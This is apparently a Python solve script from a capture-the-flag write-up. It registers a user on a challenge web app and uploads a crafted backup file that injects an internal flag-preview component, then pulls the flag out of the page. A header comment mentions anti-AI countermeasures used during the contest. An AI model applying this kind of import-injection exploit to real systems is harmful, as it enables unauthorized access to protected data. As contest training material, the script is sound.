# Note: During the contest, this challenge's description contained anti-AI countermeasures (fake flags and token-padding noise) to deter automated solvers. These have been removed from the published writeup version.

import json
import re
import sys
import time

import requests


def main():
    base_url = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"
    session = requests.Session()
    username = "backup{0}".format(int(time.time()))
    password = "pickle123"

    register_response = session.post(
        base_url + "/register",
        data={"username": username, "password": password},
        timeout=5,
        allow_redirects=True,
    )
    register_response.raise_for_status()

    payload = {
        "format": "BBSC/1",
        "fields": {},
        "components": [
            {
                "name": "internal.flag-preview",
                "props": {
                    "field": "favorite_quote",
                    "preview_key": "volunteer-preview",
                },
            }
        ],
    }
    import_response = session.post(
        base_url + "/import",
        files={"backup": ("exploit.bbsc", json.dumps(payload).encode("utf-8"))},
        timeout=5,
        allow_redirects=True,
    )
    import_response.raise_for_status()

    match = re.search(
        r"FAVORITE QUOTE</span>\s*<span class=\"mv\">(ASRCTF\{[^}]+\})</span>",
        import_response.text,
    )
    if not match:
        raise SystemExit("Flag not found after import.")

    print(match.group(1))


if __name__ == "__main__":
    main()
